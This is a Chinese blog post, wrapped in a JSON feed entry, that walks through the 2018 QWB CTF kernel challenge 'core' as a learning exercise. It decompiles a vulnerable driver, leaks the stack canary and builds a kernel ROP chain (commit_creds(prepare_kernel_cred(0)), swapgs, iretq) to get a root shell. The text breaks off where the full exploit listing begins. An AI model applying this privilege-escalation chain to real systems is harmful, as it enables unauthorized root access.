            "url": "http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/",
            "title": "强网杯2018_core",
            "date_published": "2022-05-01T10:14:39.000Z",
            "content_html": "<h1 id=\"2018强网杯core作为kernel学习开始的记录栈溢出ret2rop\"><a class=\"markdownIt-Anchor\" href=\"#2018强网杯core作为kernel学习开始的记录栈溢出ret2rop\">#</a> 2018 强网杯 core，作为 kernel 学习开始的记录，栈溢出，ret2rop</h1>\n<h2 id=\"前置zhishi\"><a class=\"markdownIt-Anchor\" href=\"#前置zhishi\">#</a> 前置 zhishi</h2>\n<h2 id=\"1题目环境\"><a class=\"markdownIt-Anchor\" href=\"#1题目环境\">#</a> 1. 题目环境</h2>\n<p>题目保护环境有两类，一类可执行文件的保护机制，一类是文件系统驱动内核的保护机制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/<span class=\"number\">2018</span>qwb_core/give_to_player$ checksec core.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/core.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">    </span><br><span class=\"line\"> start.sh:       </span><br><span class=\"line\">    qemu-system-x86_64 \\</span><br><span class=\"line\">-m 128M \\</span><br><span class=\"line\">-kernel ./bzImage \\</span><br><span class=\"line\">-initrd  ./rootfs.cpio \\</span><br><span class=\"line\">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=<span class=\"number\">1</span> quiet kaslr<span class=\"string\">&quot; \\</span></span><br><span class=\"line\"><span class=\"string\">-s  \\</span></span><br><span class=\"line\"><span class=\"string\">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\</span></span><br><span class=\"line\"><span class=\"string\">-nographic  \\</span></span><br><span class=\"line\"><span class=\"string\">~                  </span></span><br></pre></td></tr></table></figure>\n<p>可以看到这里开启了 kaslr 保护。</p>\n<h2 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h2>\n<h3 id=\"canary\"><a class=\"markdownIt-Anchor\" href=\"#canary\">#</a> canary</h3>\n<p>core.ko 开启了 canary，我们需要泄露他，进而构造 rop</p>\n<h3 id=\"kaslr\"><a class=\"markdownIt-Anchor\" href=\"#kaslr\">#</a> kaslr</h3>\n<p>kaslr 类似与用户 pwn 的 aslr 或者 pie，一种地址偏移技术。如果我们可以获取 vmlinux_base 就可以绕过这个，执行其他函数。</p>\n<p>获取方式:head /proc/kallsyms 1,startup 对应的地址就是基址</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/8fbf9fb6608de56c46b546cc63017967.png\" alt=\"img\"></p>\n<h3 id=\"core_base\"><a class=\"markdownIt-Anchor\" href=\"#core_base\">#</a> core_base</h3>\n<p>驱动加载地址，查看方式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /proc/modules</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/devices</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms</span><br><span class=\"line\"></span><br><span class=\"line\">lsmod</span><br><span class=\"line\"></span><br><span class=\"line\">dmesg</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/ <span class=\"comment\"># lsmod</span></span><br><span class=\"line\">core 16384 0 - Live 0xffffffffc02aa000 (O)</span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>core.ko 就是我们需要利用的漏洞驱动</p>\n<h3 id=\"core_ioctl\"><a class=\"markdownIt-Anchor\" href=\"#core_ioctl\">#</a> #core_ioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_ioctl</span><span class=\"params\">(__int64 fd, <span class=\"type\">int</span> idx, __int64 user_buf)</span><span class=\"comment\">//fd是设备对应的文件描述符</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( idx )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889B</span>:</span><br><span class=\"line\">      core_read(user_buf);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889C</span>:</span><br><span class=\"line\">      printk(&amp;unk_2CD);</span><br><span class=\"line\">      off = user_buf;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889A</span>:</span><br><span class=\"line\">      printk(&amp;unk_2B3);</span><br><span class=\"line\">      core_copy_func(user_buf);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据我们的传参实现三种功能， case 0x6677889C: 实现我们控制 off 全局变量</p>\n<h3 id=\"core_read\"><a class=\"markdownIt-Anchor\" href=\"#core_read\">#</a> core_read</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">core_read</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v2; <span class=\"comment\">// rdi</span></span><br><span class=\"line\">  __int64 i; <span class=\"comment\">// rcx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 canary; <span class=\"comment\">// [rsp+40h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  canary = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  printk(&amp;unk_25B);</span><br><span class=\"line\">  printk(&amp;unk_275);</span><br><span class=\"line\">  v2 = buf;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">16LL</span>; i; --i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v2 += <span class=\"number\">4</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(buf, <span class=\"string\">&quot;Welcome to the QWB CTF challenge.\\n&quot;</span>);</span><br><span class=\"line\">  result = copy_to_user(a1, &amp;buf[off], <span class=\"number\">64LL</span>);   <span class=\"comment\">// 栈任意地址读</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __readgsqword(<span class=\"number\">0x28</span>u) ^ canary;</span><br><span class=\"line\">  __asm &#123; swapgs &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>控制 off 后，我们就可一计算 buf 与 canary 的编译，然后通过 copy_to_user 将 canary 泄露出来。</p>\n<h3 id=\"core_copy_func\"><a class=\"markdownIt-Anchor\" href=\"#core_copy_func\">#</a> core_copy_func</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_copy_func</span><span class=\"params\">(__int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _QWORD v2[<span class=\"number\">10</span>]; <span class=\"comment\">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2[<span class=\"number\">8</span>] = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  printk(&amp;unk_215);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(&amp;unk_2A1);</span><br><span class=\"line\">    result = <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    qmemcpy(v2, &amp;name, (<span class=\"type\">unsigned</span> __int16)size);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>传入负数就可以绕过检查，然后实现对 v2 的溢出。</p>\n<h3 id=\"core_write\"><a class=\"markdownIt-Anchor\" href=\"#core_write\">#</a> core_write</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_write</span><span class=\"params\">(__int64 a1, __int64 _buf, <span class=\"type\">unsigned</span> __int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  printk(&amp;unk_215);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a3 &lt;= <span class=\"number\">0x800</span> &amp;&amp; !copy_from_user(&amp;name, _buf, size) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size;</span><br><span class=\"line\">  printk(&amp;unk_230);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">4294967282LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>将数据写入内核全局变量 name 中。</p>\n<p>1、通过 /tmp/kallsyms 文件获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出所需 gadget 地址。2、对全局变量 off 赋值 0x40，通过 core_read 函数获得 canary 的值。3、构建好 ropchain，使用 core_write 函数将 ropchain 复制到内核态中 4、通过 core_copy_func 函数中的数值溢出造成的栈溢出漏洞，将 ropchain 放入栈中，退出函数时完成提权并返回用户态 getrootshell。</p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>kernel rop 相较于用户态 rop 的不同点吧。在用户态中我们的目的是为了获得 shell，也就是令程序执行诸如 system (&quot;/bin/sh&quot;) 一类的函数，然而到了 kernel pwn 中我们的目的从原先的 getshell 变成了提权，也就是执行 commit_creds (prepare_kernel_cred (0)) 函数，并且执行完提权函数以后我们需要从内核态返回到用户态执行 system (&quot;/bin/sh&quot;) 获取 root 权限的 shell 才可以，所以在我看来 kernel rop 变得无非就是两步：执行提权函数，返回用户态获取 rootshell。从内核态返回用户态所需要用到的 swapgs 指令与 iretq 指令，前者是在从用户态进入内核态时，通过交换 IA32_KERNEL_GS_BASE 与 IA32_GS_BASE 值，从而得到 kernel 数据结构块，而从内核态变回用户态时需要将原先用户态的信息再交换回来。iretq 指令则用来恢复用户态的 cs、ss、rsp、rip、rflags 的信息。其具体布局如下所示：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------+\t\t\t-----lower</span><br><span class=\"line\">|    RIP    |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    CS     |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|   rflags  |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    RSP    |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    SS     |\t\t\t-----higher</span><br><span class=\"line\">+-----------+</span><br></pre></td></tr></table></figure>\n<p>在计算内核 gadget 地址的时候我们使用 ropper 得到的 gadget 地址需要加上 offset 才是真实地址，这个和用户态的一样很好理解，而这个 offset 的获取办法，因为程序将函数地址导入到了 /tmp/kallsyms 中，我们我们可以 cat 出函数的真实地址，然后减去函数的 textoffset，就得到了 vmlinux_base. 而刚才所说的 offset 就是 vmlinux_base 减去 raw_vmlinux_base，即 0xffffffff81000000 的值。这题我们可以直接获取 start_up64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/<span class=\"number\">2018</span>qwb_core/give_to_player$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    Version:  <span class=\"number\">4.15</span><span class=\"number\">.8</span></span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0xffffffff81000000</span>)</span></span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"获取vmlinux_base\"><a class=\"markdownIt-Anchor\" href=\"#获取vmlinux_base\">#</a> 获取 vmlinux_base</h3>\n<p>打开 /tmp/kallsyms，获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出 gadget 的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">GetAddress</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr;\t\t\t\t\t\t\t\t\t<span class=\"comment\">//stroull 的结束符号</span></span><br><span class=\"line\"> <span class=\"type\">char</span> buf[<span class=\"number\">0x30</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> FILE* fd = fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);\t\t\t<span class=\"comment\">//打开文件</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">while</span>(fgets(buf, <span class=\"keyword\">sizeof</span>(buf), fd)) &#123;\t\t\t<span class=\"comment\">//文件数据会进入缓存，然后再呗拷贝到buf，所以，buf会更新。</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find: commit_creds: 0x%llx\\n[+] Find: prepare_kernel_cred: 0x%llx\\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;commit_creds&quot;</span>)) &#123;\t\t\t<span class=\"comment\">//string.h库的字符串比较函数，返回字串的位置指针</span></span><br><span class=\"line\">   commit_creds = strtoull(buf, ptr, <span class=\"number\">16</span>);\t\t<span class=\"comment\">//找到了地址，将地址转为unsigned long long </span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class=\"line\">   prepare_kernel_cred = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*实例</span></span><br><span class=\"line\"><span class=\"comment\">/ # cat /tmp/kallsyms | grep commit_creds</span></span><br><span class=\"line\"><span class=\"comment\">ffffffffba29c8e0 T commit_creds</span></span><br><span class=\"line\"><span class=\"comment\">/ # </span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<p>#返回用户态的准备，我们最终要返回用户太执行 system (’/bin/sh’)，从你内核太返回的时候，iretq 会恢复某些寄存器的值。所以我们需要提前保存这些值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">SaveStatus</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> __asm__(</span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pushf;&quot;</span>\t\t\t\t\t\t<span class=\"comment\">//所有的16位标志寄存器入栈</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\"> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里才用汇编内联，将数据保存到全局变量中 user_cs， user_ss, user_sp,</p>\n<p>core.ko 一个外设，但是再 linux 中，万物皆文件，所以只需要访问 /proc/core。</p>\n<p>但是如何实现用户访问与内核的转换的呢？ioctl 函数提供响应的接口。设备对应的是 core_ioctl 函数。</p>\n<p>首先我们要泄露 canary，通过分析，我们得知，buf 与 canary 的偏移量是 0x40，core_read 函数会把 buf 拷贝到我们的 user_buf 中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ioctl(fd, CORE_OFF, <span class=\"number\">0x40</span>);\t\t\t<span class=\"comment\">//read canary to buf on kernel stack</span></span><br><span class=\"line\"> ioctl(fd, <span class=\"number\">0x6677889B</span>, user_buf); <span class=\"comment\">//canary in buf.copy it to user_buf that we can control.</span></span><br></pre></td></tr></table></figure>\n<p>下面我们就要构造 rop, 首先填充 v2 的八字节以及 canary，然后就是布置 gadget。说明一点，commit_creds (prepare_kernel_cred (0)）是在内核态执行的，只有在返回用户态的时候（也就是我们执行完了提权，才需要布置额外的寄存器的数据）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> i=<span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> rop[<span class=\"number\">0x100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">rop[i++] = canary;</span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;\t\t\t\t\t<span class=\"comment\">//覆盖rbp</span></span><br><span class=\"line\">rop[i++] = pop_rdi;\t\t\t<span class=\"comment\">//rip </span></span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;\t\t\t\t\t<span class=\"comment\">//rdi=0</span></span><br><span class=\"line\">rop[i++] = prepare_kernel_cred;\t<span class=\"comment\">//执行prepare_kernel_cred</span></span><br><span class=\"line\">rop[i++] = pop_rdx;\t\t\t\t</span><br><span class=\"line\">rop[i++] = commit_creds;</span><br><span class=\"line\">rop[i++] = mov_rdi_rax;\t\t\t<span class=\"comment\">//将prepare_kernel_cred的返回值作为commit_creds的参数。mov_rdi_rax,jmp rdx.</span></span><br><span class=\"line\"><span class=\"comment\">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class=\"line\">rop[i++] = swapgs;\t\t\t\t\t<span class=\"comment\">//gadget 是swapgs ;popfq;ret,</span></span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">rop[i++] = iretq;\t\t\t\t\t</span><br><span class=\"line\">rop[i++] = (<span class=\"type\">size_t</span>)GetShell;</span><br><span class=\"line\">rop[i++] = user_cs;</span><br><span class=\"line\">rop[i++] = user_rflags;</span><br><span class=\"line\">rop[i++] = user_sp;</span><br><span class=\"line\">rop[i++] = user_ss;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"完整的exp\"><a class=\"markdownIt-Anchor\" href=\"#完整的exp\">#</a> 完整的 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span 